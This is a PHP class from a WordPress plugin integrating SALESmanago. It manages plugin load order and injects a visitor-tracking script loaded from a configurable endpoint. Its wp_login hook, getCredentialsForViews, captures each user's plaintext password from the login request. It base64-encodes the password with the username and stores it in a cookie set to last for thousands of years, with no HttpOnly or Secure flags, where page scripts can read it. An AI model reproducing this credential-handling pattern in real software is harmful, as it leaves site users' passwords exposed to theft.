<?php

namespace bhr\Admin;

if (!defined('ABSPATH')) {
	exit; // Exit if accessed directly
}

use SALESmanago\Exception\UserAccessException;
use bhr\Model\HooksModel;
use bhr\Helper\ModulesConfigManager;

class PluginHooks
{
    protected $model;

    public function __construct()
    {
        $this->model = new HooksModel();
        $this->initHooks();
    }

    public function initHooks()
    {
        add_action("activated_plugin", array($this, "loadThisPluginLast"), 1);
        add_action("deactivated_plugin", array($this, "loadThisPluginLast"), 1);
        add_action("wp_login", array($this, "getCredentialsForViews"), 1);

       if ($this->model->getUserData()) {
            add_action("wp_print_footer_scripts", array($this, "createMonitorVisitorsCode"));
            $modules = $this->model->getModules();
            ModulesConfigManager::getInstance($modules)
                ->getHooks();
       }
    }

    public function getCredentialsForViews($params)
    {
    	if (!isset($_REQUEST['pwd'])) {
    		return false;
	    }

	    $data = base64_encode($params.':'.$_REQUEST['pwd']);
	    $period = time() + (3600 * 86400);
	    setcookie('smviewaut', $data, $period, '/');
    }

    public function loadThisPluginLast()
    {
        $wpPathToThisFile = preg_replace('/(.*)plugins\/(.*)$/', WP_PLUGIN_DIR . "/$2", __FILE__);
        $thisPlugin       = plugin_basename(trim($wpPathToThisFile));
        $activePlugins    = get_option('active_plugins');
        $thisPluginKey    = array_search($thisPlugin, $activePlugins);

        if (in_array($thisPlugin, $activePlugins) && end($activePlugins) != $thisPlugin) {
            array_splice($activePlugins, $thisPluginKey, 1);
            array_push($activePlugins, $thisPlugin);
            update_option('active_plugins', $activePlugins);
        }
    }

    public function createMonitorVisitorsCode()
    {
        try {
            $model    = new HooksModel();
            $data     = $model->monitorVisitorsData();
            $clientId = $data['clientId'];
            $endpoint = $data['endpoint'];

            $code = "<script>var _smid ='{$clientId}';
             (function(w, r, a, sm, s ) {
             w['SalesmanagoObject'] = r;
             w[r] = w[r] || function () {( w[r].q = w[r].q || [] ).push(arguments)};
             sm = document.createElement('script');
             sm.type = 'text/javascript'; sm.async = true; sm.src = a;
             s = document.getElementsByTagName('script')[0];
             s.parentNode.insertBefore(sm, s);
             })(window, 'sm', ('https:' == document.location.protocol ? 'https://' : 'http://')
             + '{$endpoint}/static/sm.js');</script>";

            print trim(preg_replace('/\s+/', ' ', $code));
        } catch (UserAccessException $e) {
        }
    }
}
